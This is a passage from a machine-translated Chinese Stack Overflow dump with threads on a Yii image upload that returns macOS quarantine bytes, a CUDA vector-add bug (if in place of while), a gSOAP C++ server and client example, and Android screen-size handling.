                $file_thumb_name = $file_tem_name.'_thumb.'.$file_extention;
                $file_image_name = $file_tem_name.".".$file_extention;
                if( $model->validate( ) ) {
                    //Move our file to our temporary dir
                    $model->file->saveAs( $path.$file_image_name );
                    if(chmod($path.$file_image_name, 0777 )){

     //                 Yii::import("ext.EPhpThumb.EPhpThumb");
                    // $thumb_=new EPhpThumb();
                 //      $thumb_->init();
                    // $thumb_->create($path.$file_image_name)
                    //  ->resize(110,80)
                    //  ->save($path.$file_thumb_name); 

                    }
                    //here you can also generate the image versions you need 
                    //using something like PHPThumb

                    //Now we need to save this path to the user's session
                    if( Yii::app( )->user->hasState( 'images' ) ) {
                        $userImages = Yii::app( )->user->getState( 'images' );
                    } else {
                        $userImages = array();
                    }
                     $userImages[] = array(
                          "filename" => $file_image_name,
                        'size' => $model->size,
                        'mime' => $model->mime_type,
                        "path" => $path.$file_image_name,
                       // "thumb" => $path.$file_thumb_name,
                    );
                    Yii::app( )->user->setState('images', $userImages);      
                    //Now we need to tell our widget that the upload was succesfull
                    //We do so, using the json structure defined in
                    // https://github.com/blueimp/jQuery-File-Upload/wiki/Setup
                    echo json_encode( array( array(
                            "type" => $model->mime_type,
                            "size" => $model->size,
                            "url" => $publicPath.$file_image_name,
                            //"thumbnail_url" => $publicPath.$file_thumb_name,
                            //"thumbnail_url" => $publicPath."thumbs/$filename",
                            "delete_url" => $this->createUrl( "upload", array(
                                "_method" => "delete",
                                "file" => $file_image_name
                            ) ),
                            "delete_type" => "POST"
                        ) ) ); 
```

上面的代码给了我正确的响应， [{"type":"image/jpeg","size":2266,"url":"/uploads/tmp/0b00cbaee07c6410241428c74aae1dca.jpeg","delete_url":"/api/imageUpload/上传？_method=delete&file=0b00cbaee07c6410241428c74aae1dca.jpeg","delete_type":"POST"}]

但如果我取消注释以下

```
 //     Yii::import("ext.EPhpThumb.EPhpThumb");
                // $thumb_=new EPhpThumb();
             //      $thumb_->init();
                // $thumb_->create($path.$file_image_name)
                //  ->resize(110,80)
                //  ->save($path.$file_thumb_name); 
```

它给了我损坏的响应：

Mac OS X 2��ATTR�dA��Y�Ycom.apple.quarantine0001;50655994;Google\x20Chrome.app;2599ECF9-69C5-4386-B3D9-9F5CC7E0EE1D|com.google.Chrome此资源分叉故意留空��[ {"type":"image/jpeg","size":1941,"url":"/uploads/tmp/409c5921c6d20944e1a81f32b12fc380.jpeg","delete_url":"/api/imageUpload/upload?_method=delete&file=409c5921c6d20944e1a81f32b12\. jpeg","delete_type":"POST"}]

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-30T09:34:38.680

我猜 MacOS 已经隔离了您下载的`ext.EPhpTHumb.EPhpThumb`库或其中一个库。

如果您知道插件的安装位置，请尝试`xattr -d com.apple.quarantine <filename>`从终端将其删除，或者通过谷歌`remove mac os x quarantine status`搜索其他方法。

# cuda - CUDA - 内存限制 - 向量求和

> ID：12659988
> 
> 赞同：0
> 
> 时间：2012-09-30T08:54:18.207
> 
> 标签：cuda, nvidia

我正在尝试学习 CUDA，以下代码对于值 N<= 16384 可以正常工作，但对于更大的值则失败（代码末尾的求和检查失败，对于 i> 的索引值，c 值始终为 0 =16384）。

```
#include<iostream>
#include"cuda_runtime.h"
#include"../cuda_be/book.h"

#define N (16384)

__global__ void add(int *a,int *b,int *c)
{
    int tid = threadIdx.x + blockIdx.x * blockDim.x;
    if(tid<N)
    {
        c[tid] = a[tid] + b[tid];
        tid += blockDim.x * gridDim.x;
    }
}

int main()
{
    int a[N],b[N],c[N];
    int *dev_a,*dev_b,*dev_c;

    //allocate mem on gpu
    HANDLE_ERROR(cudaMalloc((void**)&dev_a,N*sizeof(int)));
    HANDLE_ERROR(cudaMalloc((void**)&dev_b,N*sizeof(int)));
    HANDLE_ERROR(cudaMalloc((void**)&dev_c,N*sizeof(int)));

    for(int i=0;i<N;i++)
    {
        a[i] = -i;
        b[i] = i*i;
    }

    HANDLE_ERROR(cudaMemcpy(dev_a,a,N*sizeof(int),cudaMemcpyHostToDevice));
    HANDLE_ERROR(cudaMemcpy(dev_b,b,N*sizeof(int),cudaMemcpyHostToDevice));
    system("PAUSE");
    add<<<128,128>>>(dev_a,dev_b,dev_c);

    //copy the array 'c' back from the gpu to the cpu

    HANDLE_ERROR( cudaMemcpy(c,dev_c,N*sizeof(int),cudaMemcpyDeviceToHost));

    system("PAUSE");
    bool success = true;
    for(int i=0;i<N;i++)
    {
        if((a[i] + b[i]) != c[i])
        {
            printf("Error in %d: %d + %d != %d\n",i,a[i],b[i],c[i]);
            system("PAUSE");
            success = false;
        }

    }

    if(success) printf("We did it!\n");

    cudaFree(dev_a);
    cudaFree(dev_b);
    cudaFree(dev_c);

    return 0;
} 
```

我认为这是一个与共享内存相关的问题，但我无法给出一个好的解释（可能缺乏知识）。你能否为我提供一个解释和解决方法来运行大于 16384 的 N 值。这是我的 GPU 的规格：

```
General Info for device 0
Name: GeForce 9600M GT
Compute capability: 1.1
Clock rate: 1250000
Device copy overlap : Enabled
Kernel Execution timeout : Enabled
Mem info for device 0
Total global mem: 536870912
Total const mem: 65536
Max mem pitch: 2147483647
Texture Alignment 256
MP info about device 0
Multiproccessor count: 4
Shared mem per mp: 16384
Registers per mp: 8192
Threads in warp: 32
Max threads per block: 512
Max thread dimensions: (512,512,64)
Max grid dimensions: (65535,65535,1) 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-30T10:34:14.283

你可能打算写

```
while(tid<N) 
```

不是

```
if(tid<N) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-11T11:15:17.083

您并没有用完共享内存，而是将矢量数组复制到设备的全局内存中。如您所见，这比您需要的 196608 字节 (16384*4*3) 有更多的可用空间。

出现问题的原因是每个线程只执行一个加法操作，因此使用这种结构，向量可以是的最大维度是内核启动中的块 * 线程参数，正如 tera 所指出的那样。通过纠正

```
if(tid<N) 
```

到

```
while(tid<N) 
```

在您的代码中，每个线程将在多个索引上执行其添加，并且将考虑整个数组。

有关内存层次结构和内存可以放置的各种不同位置的更多信息，您应该阅读 CUDA 工具包提供的 CUDA_C_Programming_Guide.pdf 的第 2.3 和 5.3 节。

希望有帮助。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-06T22:26:59.000

如果 N 是：

```
#define N (33 * 1024) //value defined in Cuda by Examples 
```

我在*Cuda by Example*中找到的相同代码，但 N 的值不同。我认为 N 的 o 值不能是 33 * 1024。我必须更改参数块数和每个块的线程数。因为：

```
add<<<128,128>>>(dev_a,dev_b,dev_c); //16384 threads 
```

(128 * 128) < (33 * 1024) 所以我们发生了崩溃。

# c++ - gSOAP C++ 多线程独立服务器和客户端示例

> ID：12659991
> 
> 赞同：0
> 
> 时间：2012-09-30T08:54:34.403
> 
> 标签：c++, soap, gsoap

我是 gSOAP 的新手，有人可以发布一个工作 gSOAP 多线程 C++ 独立服务器和客户端。在 gSOAP 文档中，多线程独立服务器没有详细说明在何处调用 web 服务函数，例如 int ns_add(int a , int b) ，也没有调用 main 中头文件 calc.h 中定义的函数服务器类 - calc.cpp。

请给出一步一步的指导，这将有助于像我这样的新人。

您的回复将不胜感激。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2014-01-02T09:50:29.013

这是 c++ 中 gsoap 的一个示例：在头文件中，我们有例如这个函数（服务）：

```
int yb__add_list(char *name, char *tel, char **result);
int yb__del_list(int no, char **result); 
int yb__get_tel_by_name(char *name, char **result);
int yb__get_name_by_tel(char *tel, char **result);
int yb__get_list(char **result); 
```

通过运行 soapcpp2 interface.h 生成我们的存根后，我们有一些文件，检查文档以了解它：soapStub.h、soapH.h、soapC.c、soapClient.c、soapServer.c 然后我们可以实现这样的服务：

```
int main(int argc, char **argv)
{ int m, s; /* master and slave sockets */
struct soap soap;

soap_init(&soap);
load_list();
show_list();
if (argc < 2)
soap_serve(&soap);  /* serve as CGI application */
else
{ m = soap_bind(&soap, NULL, atoi(argv[1]), 100);
if (m < 0)
{ soap_print_fault(&soap, stderr);
  exit(-1);
}
fprintf(stderr, "Socket connection successful: master socket = %d\n", m);
for ( ; ; )
{ s = soap_accept(&soap);
  fprintf(stderr, "Socket connection successful: slave socket = %d\n", s);
  if (s < 0)
  { soap_print_fault(&soap, stderr);
    exit(1);
  } 
  soap_serve(&soap);
  soap_end(&soap);
  }
  }
  return 0;
  } 

 int yb__add_list(struct soap *soap, char *name, char *tel, char **result)
 {
 printf("the name is %s, tel is %s\n", name, tel);
 *result = (char *) soap_malloc(soap, 50);
 if(add_list(name, tel) > 0)
 strcpy(*result, "Success!");
 else
 strcpy(*result, "Failed!");
 show_list();
 save_list();
 return SOAP_OK;
 }
 int yb__del_list(struct soap *soap, int no, char **result)
 {
 *result = (char *) soap_malloc(soap, 50);
 if(delete_list(no) > 0)
 strcpy(*result, "Success!");
 else
 strcpy(*result, "Failed!");
 save_list();
 return SOAP_OK;
 }
 int yb__get_tel_by_name(struct soap *soap, char *name, char **result)
 {
 char tel[50];
 *result = (char *) soap_malloc(soap, 200);
 if(get_tel_by_name(name, tel ) == 1)
 sprintf(*result, "The tel of %s is: \n%s\nSuccess!", name, tel);
 else
 strcpy(*result, "Failed!");
 return SOAP_OK;
 }
 int yb__get_name_by_tel(struct soap *soap, char *tel, char **result)
 {
 char name[50];

 *result = (char *) soap_malloc(soap, 200);
 if(get_name_by_tel(tel, name) == 1)
 sprintf(*result, "The owner of %s is: \n%s\nSuccess!", tel, name);
 else
 strcpy(*result, "Failed!");
 return SOAP_OK;
 }
 int yb__get_list(struct soap *soap, char **result)
 {
 *result = (char *)malloc(1024);
 get_list(*result);
 return SOAP_OK;  
 } 
```

您可以在终端 ./server +Port 中将您的服务作为单独的服务器执行，然后在客户端：

```
const char server[] = "localhost:8080/";
int executecmd(char *inbuf,  struct soap *p_soap);
int main(void)
{
struct soap soap;
char inbuf[MAX_CANON];
int ret;
soap_init(&soap);
for( ; ; ) {
fputs(NEWLINE_STRING, stdout);
fputs(CLIENT_PROMPT_STRING, stdout);
if (fgets(inbuf, MAX_CANON, stdin) == NULL)
  break;
if (*(inbuf + strlen(inbuf) - 1) == NEWLINE_SYMBOL)
  *(inbuf + strlen(inbuf) - 1) = 0;
if(is_blank_line(inbuf))
  continue;
if((ret = executecmd(inbuf, &soap)) < 0) 
  break; /* accept the quit command */
else if(ret == 0)
  continue; /* encount the error command */

}
return 1;
}

int executecmd(char *inbuf,  struct soap *p_soap)
{
char *result;
int n;
char **chargv;

if((n = makeargv(inbuf, BLANK_STRING, &chargv)) < 0){
printf("makeargv error\n");
exit(0);
}
if(!strcmp(chargv[0], "add") && n == 3){
soap_call_yb__add_list(p_soap, server, "", chargv[1], chargv[2], &result);
printf("%s\n", result);
return 0;
}
else if(!strcmp(chargv[0], "del") && n == 2 ){
soap_call_yb__del_list(p_soap, server, "", atoi(chargv[1]), &result);
printf("%s\n", result);
return 0;
}
else if(!strcmp(chargv[0], "gettel") &&  n == 2){
soap_call_yb__get_tel_by_name(p_soap, server, "", chargv[1], &result);
printf("%s\n", result);
return 0;
}
else if(!strcmp(chargv[0], "getname") &&  n == 2){
soap_call_yb__get_name_by_tel(p_soap, server, "", chargv[1], &result);
printf("%s\n", result);
return 0;
}
else if(!strcmp(chargv[0], "list")){
soap_call_yb__get_list(p_soap, server, "", &result);
printf("%s\n", result);
return 0;   
}
else if(!strcmp(chargv[0], QUIT_STRING)){
return -1;
}
else if(!strcmp(chargv[0], HELP_STRING)){
printf("The usage of the command:\n");
printf("\"add name tel\"     add new entry to address book.\n");
printf("\"del no\"           delete entry by its corresponding phone number.\n");
printf("\"getname tel\"      get name by the corresponding phone number.\n");
printf("\"gettel name\"      get phone number by name.\n");
printf("\"list\"             list the current entries in the address book.\n");
printf("\"help\"             get help.\n");
printf("\"quit\"             quit this client.\n");
return 0;    
}
else{
printf("Can not execute this command.\n input \"help\" to get usage of commands.");
return 0;
}
return 1;
} 
```

您也可以像这样在终端中运行客户端：./client

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2014-01-27T10:19:21.240

您可以在系统上安装 gsoap 的位置找到许多 gsoap 示例。您会在安装文件夹中找到一个**SAMPLE**文件夹，以帮助您了解 gSoap 的不同应用。

# java - 设计 Android 应用程序的 UI 以使其在所有手机型号上看起来都一样？

> ID：12659997
> 
> 赞同：4
> 
> 时间：2012-09-30T08:55:12.283
> 
> 标签：java, android, mobile

在设计网站时，您必须特别考虑以确保网站不会因各种屏幕分辨率而中断。

在设计 Android 应用时，是否也有类似的考虑？还是所有 Android 手机的屏幕尺寸/分辨率都与在模拟器上运行的应用程序可以在所有/大多数运行 Android 的手机型号上运行的相同？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-30T09:33:13.217

正如我在评论中所说，`Android`设备有不同的屏幕尺寸和密度。如果您想提供用户喜欢和使用的优质应用程序，那么在构建应用程序时必须考虑这一点。

关于屏幕尺寸，您可以`Android`发挥它的魔力并将您的单一布局修改为不同的设备。这会起作用，但应用程序的质量会下降。一个简单的例子是智能手机和平板电脑之间的布局差异。带有`ListView`小部件的布局在智能手机上看起来不错，但在 10 英寸平板电脑上却不行（您可以/应该在单个屏幕上提供更多功能）。

您必须考虑屏幕的密度才能为您的应用提供出色的外观，否则依赖默认系统会降低您的应用在大量设备上的视觉吸引力。

我不知道这是否是您的问题的目标，但随着`Android`平台的发展，从 API 级别到下一个 API 级别有很多（或相当数量）的变化。如果您正在使用仅在较新版本上可用的 API，您必须小心并在较旧版本上移植该功能（当然，如果您打算支持它们）或让您的应用程序以体面的方式简单地避免它们。

您可以在官方 android 网站上找到更多信息，[这里](http://developer.android.com/guide/practices/screens_support.html)是 android 开发人员应始终用于他正在构建的应用程序的最佳实践。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2014-02-08T09:08:17.260

在 Android 上，我们可以使用从***Android 3.2***引入的***屏幕尺寸选择器***来定义要使用的布局。更多详细信息，请访问[http://android-developers.blogspot.in/2011/07/new-tools-for-managing-screen-sizes.html](http://android-developers.blogspot.in/2011/07/new-tools-for-managing-screen-sizes.html)。以下代码片段已从同一链接中提取：

 *```
public class MyActivity extends Activity 
{
    @Override protected void onCreate(Bundle savedInstanceState)
    {
        super.onCreate();
        Configuration config = getResources().getConfiguration();
        if (config.smallestScreenWidthDp >= 600) 
        {
            setContentView(R.layout.main_activity_tablet);
        } 
        else 
        {
            setContentView(R.layout.main_activity);
        }
    }
} 
```

尺寸配置的另一个很好的参考是保持分隔符。这是详细解释：[http ://www.vanteon.com/downloads/Scaling_Android_Apps_White_Paper.pdf](http://www.vanteon.com/downloads/Scaling_Android_Apps_White_Paper.pdf)*